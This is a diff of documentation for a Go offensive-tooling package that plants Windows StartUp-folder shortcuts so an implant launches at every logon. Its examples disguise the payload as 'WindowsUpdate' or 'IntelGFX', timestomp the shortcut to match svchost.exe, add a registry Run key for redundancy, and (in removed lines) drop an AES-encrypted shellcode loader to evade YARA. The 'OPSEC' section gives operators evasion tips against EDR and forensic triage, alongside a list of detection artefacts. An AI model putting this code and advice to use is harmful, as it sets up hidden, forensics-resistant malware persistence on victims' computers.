@@ -1,181 +1,215 @@
-# StartUp Folder Persistence
-
-[<- Back to Persistence Overview](README.md)
-
-**MITRE ATT&CK:** [T1547.001](https://attack.mitre.org/techniques/T1547/001/), [T1547.009 - Shortcut Modification](https://attack.mitre.org/techniques/T1547/009/)
-**Package:** `persistence/startup`
-**Platform:** Windows
-**Detection:** Medium
-
 ---
+package: github.com/oioio-space/maldev/persistence/startup
+last_reviewed: 2026-04-27
+reflects_commit: f8b1a51
+---
+
+# StartUp folder persistence
+
+[← persistence index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Drop a `.lnk` shortcut into the user or machine StartUp folder.
+Windows Shell launches every shortcut it finds at user logon. No
+admin needed for user-scope; admin for machine-wide. Implements
+[`persistence.Mechanism`](../../../persistence). Sibling to
+[`persistence/registry`](registry.md) — pair them for
+redundancy.
 
 ## Primer
 
-Windows has a special "Startup" folder. Any shortcut (.lnk) placed in this folder is automatically launched when the user logs on. This technique creates a shortcut pointing to the payload using COM/OLE automation.
+The StartUp folder is the GUI-era equivalent of Run keys.
+Windows Shell scans two well-known directories at logon and
+launches every shortcut it finds:
 
----
+- **User**: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
+- **Machine**: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
+
+Once-popular as an "easy" persistence path, it's now well-known
+to defensive tooling — but the user folder still sees less
+default scrutiny than HKLM\…\Run on most stacks. The package
+wraps [`persistence/lnk`](lnk.md) (LNK creation primitive) with
+the right paths and a `Mechanism` adapter.
 
 ## How It Works
 
 ```mermaid
 sequenceDiagram
-    participant Implant
-    participant COM as WScript.Shell (COM)
-    participant Folder as Startup Folder
-    participant Logon as User Logon
+    participant Impl as Implant
+    participant Lnk as persistence/lnk
+    participant FS as %APPDATA%\…\Startup
+    participant Logon as User logon
+    participant Shell as Windows Shell
 
-    Implant->>COM: CreateShortcut("payload.lnk")
-    COM->>Folder: Save .lnk file
-    Note over Folder: %APPDATA%\Microsoft\Windows\<br/>Start Menu\Programs\Startup
-
-    Note over Logon: User logs on
-    Logon->>Folder: Enumerate .lnk files
-    Folder-->>Logon: payload.lnk → C:\Temp\payload.exe
-    Logon->>Implant: Execute payload
+    Impl->>Lnk: New().SetTargetPath(payload).Save(<dir>\Update.lnk)
+    Lnk->>FS: write .lnk
+    Note over Logon: Reboot / log off + log on
+    Shell->>FS: enumerate Startup folder
+    FS-->>Shell: Update.lnk (target = payload)
+    Shell->>Impl: CreateProcess(payload)
 ```
 
----
+Per-user paths can be discovered via `SHGetKnownFolderPath` /
+`%APPDATA%`; the package's `UserDir` / `MachineDir` helpers
+encapsulate that.
 
-## Usage
+## API Reference
+
+### Functions
+
+| Symbol | Description |
+|---|---|
+| [`UserDir() (string, error)`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/startup#UserDir) | Resolve `%APPDATA%\…\Startup` for the calling user |
+| [`MachineDir() (string, error)`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/startup#MachineDir) | Resolve `%PROGRAMDATA%\…\StartUp` |
+| [`Install(name, target, args)`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/startup#Install) | Drop a `.lnk` into the user folder |
+| [`InstallMachine(name, target, args)`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/startup#InstallMachine) | Drop a `.lnk` into the machine folder (admin) |
+| [`Remove(name) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/startup#Remove) | Delete the user-folder shortcut |
+| [`RemoveMachine(name) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/startup#RemoveMachine) | Delete the machine-folder shortcut |
+| [`Exists(name) bool`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/startup#Exists) | User-folder presence probe |
+| [`Shortcut(name, target, args) *ShortcutMechanism`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/startup#Shortcut) | `Mechanism` adapter for `persistence.InstallAll` |
+
+`name` must be the value the LNK file will get *without* the
+`.lnk` suffix — `Install` appends it.
+
+## Examples
+
+### Simple — user-scope drop
 
 ```go
 import "github.com/oioio-space/maldev/persistence/startup"
 
-// Install shortcut in user's Startup folder
-err := startup.Install("WindowsUpdate", `C:\Temp\payload.exe`, "--silent")
-
-// Check
-exists := startup.Exists("WindowsUpdate")
-
-// Remove
-err = startup.Remove("WindowsUpdate")
+_ = startup.Install("WindowsUpdate",
+    `C:\Users\Public\winupdate.exe`,
+    "--silent")
+defer startup.Remove("WindowsUpdate")
 ```
 
----
+### Composed — Mechanism + idempotency
 
-## Advanced — Machine-Wide Install via Mechanism Interface
+```go
+m := startup.Shortcut("WindowsUpdate",
+    `C:\Users\Public\winupdate.exe`, "")
+if !startup.Exists("WindowsUpdate") {
+    _ = m.Install()
+}
+```
 
-`InstallMachine` writes to `%ALLUSERSPROFILE%\...\Startup` (requires admin)
-so the shortcut fires for every user, not just the current one. The
-`Shortcut()` helper returns a `Mechanism` interface, composable with the
-rest of the persistence tier.
+### Advanced — machine-wide install + timestomp
+
+Drop the launcher in the machine folder so the implant runs at
+*every* user's logon, then timestomp the resulting LNK so it
+blends with surrounding Microsoft files.
 
 ```go
 import (
-    "log"
-
-    "github.com/oioio-space/maldev/persistence/startup"
-)
-
-// Per-user shortcut (no elevation).
-m := startup.Shortcut("IntelUpdate", `C:\ProgramData\Intel\agent.exe`, "")
-if err := m.Install(); err != nil {
-    log.Fatal(err)
-}
-
-// Machine-wide shortcut (requires admin token).
-if err := startup.InstallMachine(
-    "IntelUpdate",
-    `C:\ProgramData\Intel\agent.exe`,
-    "",
-); err != nil {
-    log.Fatal(err)
-}
-
-installed, _ := m.Installed()
-log.Printf("installed: %v", installed)
-```
-
----
-
-## Combined Example — Drop + Startup + Timestomp
-
-Drop an encrypted payload, register it as a per-user Startup shortcut, then
-timestomp the LNK file itself to predate the investigation window.
-
-```go
-package main
-
-import (
-    "fmt"
-    "log"
     "os"
+    "path/filepath"
 
     "github.com/oioio-space/maldev/cleanup/timestomp"
-    "github.com/oioio-space/maldev/crypto"
     "github.com/oioio-space/maldev/persistence/startup"
 )
 
-func main() {
-    const drop = `C:\Users\Public\Intel\gfx.exe`
+const target = `C:\ProgramData\Microsoft\winupdate.exe`
 
-    // 1. Encrypt payload and drop to disk.
-    key, _ := crypto.NewAESKey()
-    payload := []byte{ /* shellcode / loader */ }
-    blob, _ := crypto.EncryptAESGCM(key, payload)
-    _ = os.MkdirAll(`C:\Users\Public\Intel`, 0o755)
-    _ = os.WriteFile(drop, blob, 0o644)
-
-    // 2. Register Startup LNK.
-    if err := startup.Install("IntelGFX", drop, ""); err != nil {
-        log.Fatal(err)
-    }
-
-    // 3. Timestomp the LNK so timeline triage places it in the OS install
-    //    window, not today.
-    startDir, _ := startup.UserDir()
-    lnk := fmt.Sprintf(`%s\IntelGFX.lnk`, startDir)
-    if err := timestomp.CopyFromFull(`C:\Windows\System32\svchost.exe`, lnk); err != nil {
-        log.Printf("timestomp lnk: %v", err)
-    }
+if err := startup.InstallMachine("WindowsUpdate", target, ""); err != nil {
+    panic(err)
 }
+
+machineDir, _ := startup.MachineDir()
+lnkPath := filepath.Join(machineDir, "WindowsUpdate.lnk")
+
+ref, _ := os.Stat(`C:\Windows\System32\svchost.exe`)
+t := ref.ModTime()
+_ = timestomp.SetFull(lnkPath, t, t, t)
 ```
 
-Layered benefit: encrypted binary defeats YARA file-content rules; Startup
-LNK survives user-level persistence without registry or task-scheduler noise;
-timestomped LNK doesn't stand out in `dir /tq` forensics.
+### Pipeline — startup + registry redundancy
 
----
-
-## API Reference
+Pair a Run-key with the StartUp shortcut so removing one does
+not lose persistence.
 
 ```go
-// UserDir resolves
-// %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup.
-func UserDir() (string, error)
+import (
+    "github.com/oioio-space/maldev/persistence"
+    "github.com/oioio-space/maldev/persistence/registry"
+    "github.com/oioio-space/maldev/persistence/startup"
+)
 
-// MachineDir resolves
-// C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
-// (writable only with admin).
-func MachineDir() (string, error)
+const target = `C:\Users\Public\winupdate.exe`
 
-// Install drops a .lnk pointing at targetPath in the user-Startup
-// folder. The shortcut launches with `args` as its command-line.
-func Install(name, targetPath, args string) error
-
-// InstallMachine is the all-users counterpart of Install
-// (requires admin).
-func InstallMachine(name, targetPath, args string) error
-
-// Remove deletes the named user-Startup .lnk.
-func Remove(name string) error
-
-// RemoveMachine deletes the named all-users-Startup .lnk.
-func RemoveMachine(name string) error
-
-// Exists reports whether a user-Startup .lnk by that name is present.
-func Exists(name string) bool
-
-// Shortcut returns a persistence.Mechanism wrapping
-// Install/Remove/Exists for use with persistence.Pipeline.
-func Shortcut(name, targetPath, args string) *ShortcutMechanism
-
-type ShortcutMechanism struct{ /* unexported */ }
-
-func (m *ShortcutMechanism) Name() string
-func (m *ShortcutMechanism) Install() error
-func (m *ShortcutMechanism) Uninstall() error
-func (m *ShortcutMechanism) Installed() (bool, error)
+mechs := []persistence.Mechanism{
+    startup.Shortcut("WindowsUpdate", target, ""),
+    registry.RunKey(registry.HiveCurrentUser, registry.KeyRun,
+        "WindowsUpdateBackup", target),
+}
+_ = persistence.InstallAll(mechs)
 ```
 
-See also [persistence.md](../../persistence.md#persistencestartup----startup-folder-lnk-shortcuts) for the package summary row.
+See [`ExampleShortcut`](../../../persistence/startup/startup_example_test.go).
+
+## OPSEC & Detection
+
+| Artefact | Where defenders look |
+|---|---|
+| File creation under `%APPDATA%\…\Startup` | Path-scoped EDR rules — high-fidelity even for benign-looking LNKs |
+| File creation under `%PROGRAMDATA%\…\StartUp` | Same, with admin involvement adding to the signal |
+| `autoruns.exe -lcuser` / `-l` listing | Sysinternals Autoruns surfaces both folders |
+| LNK pointing at user-writable / temp paths | Defender heuristic |
+| LNK with mismatched icon vs target binary | EDR rule cross-checks `IconLocation` vs `TargetPath` |
+| Implant binary lacking signature + Microsoft VERSIONINFO | Pair with [`pe/masquerade`](../pe/masquerade.md) + [`pe/cert`](../pe/certificate-theft.md) |
+
+**D3FEND counters:**
+
+- [D3-FCA](https://d3fend.mitre.org/technique/d3f:FileContentAnalysis/)
+  — LNK header inspection.
+- [D3-SEA](https://d3fend.mitre.org/technique/d3f:StaticExecutableAnalysis/)
+  — target-binary review.
+
+**Hardening for the operator:**
+
+- Prefer the user folder unless machine-wide is required —
+  lower default coverage.
+- Match icon + display name to a plausible identity (Notes,
+  Update, OneDrive).
+- Pair with [`cleanup/timestomp`](../cleanup/) so the LNK's
+  MFT timestamps blend with surrounding Microsoft artefacts.
+- Pair with [`persistence/registry`](registry.md) for
+  redundancy via `persistence.InstallAll`.
+- Avoid this technique when the target stack runs strict ASR
+  rules ("Block executable content from email client and
+  webmail" applies to LNKs delivered via that channel).
+
+## MITRE ATT&CK
+
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Boot or Logon Autostart Execution: Startup Folder | full — user + machine | D3-FCA |
+| [T1547.009](https://attack.mitre.org/techniques/T1547/009/) | Shortcut Modification | partial — LNK creation primitive (delegated to `persistence/lnk`) | D3-FCA |
+
+## Limitations
+
+- **Logon-only trigger.** Like Run keys, fires at user logon
+  — not at boot.
+- **One LNK per name.** Re-installing under the same name
+  overwrites the existing shortcut without warning.
+- **Windows-only.** No cross-platform stub.
+- **Visible to standard triage.** Both folders are universal
+  IR triage targets.
+- **No service-account context.** LNKs run in the logging-in
+  user's session — for SYSTEM-scope persistence use
+  [`persistence/service`](service.md).
+
+## See also
+
+- [`persistence/lnk`](lnk.md) — underlying LNK creation
+  primitive.
+- [`persistence/registry`](registry.md) — sibling logon
+  trigger; pair for redundancy.
+- [`persistence/scheduler`](task-scheduler.md) — sibling with
+  pre-logon (boot / startup) triggers.
+- [`pe/masquerade`](../pe/masquerade.md) — clone identity for
+  the launched binary.
+- [`cleanup/timestomp`](../cleanup/) — align LNK timestamps.
+- [Operator path](../../by-role/operator.md).
+- [Detection eng path](../../by-role/detection-eng.md).
